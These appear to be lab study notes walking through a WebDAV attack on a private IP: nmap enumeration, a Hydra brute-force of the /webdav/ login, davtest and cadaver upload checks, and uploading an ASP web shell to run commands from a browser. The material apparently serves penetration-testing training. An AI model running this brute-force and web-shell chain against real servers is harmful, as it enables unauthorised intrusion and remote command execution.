# WebDAV Vulnerabilities

**Step 1** : Gather information  
Quick scan  
Check which port WebDAV is running (80 in the video)
```bash
nmap -sV -sC 10.2.17.124
```
Gather more information
```bash
nmap -sV -p 80 --script=http-enum 10.2.17.124
```
**Step 2**: Brute force   
On browser, type IP address and path to WebDAV with Step 1  
If it authentication enabled -> Try brute force (`Hydra`)  
```bash
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
```
**Step 3**: Use WebDAV  
```bash
davtest -url http://<IP>/webdav
```
When it requires authentication  
Check `Summary` to see which types of files can be excuted
```bash
davtest -auth <username>:<password> -url http://<IP>/webdav
```
Access the contents
```bash
cadaver http://<target IP>/webdav
```
**Step 4**: Make change  
In new Terminal tab command below to see wchich web shell available
```bash
ls -al /usr/share/webshells/
#Output
asp/  aspx/  cfm/  jsp/  laudanum/ perl/  php/  seclists/
```
Choose web shell
```bash
ls -al /usr/share/webshells/asp/
```
Upload the web shell to cadava
```bash
put /usr/share/webshells/asp/webshell.asp
```
On browser, you can see web shell uploaded  
In the file, type command and hit the Run button to run








#### Note
`Hydra`
- Use to crack various protocol from
  FTP, SSH and Web authentication forms
- -L : file with usernames
- -P : file with passwords

`Web Shell`
- A script or program uploaded to a web server  
  that lets an attacker execute commands remotely through a web browser.
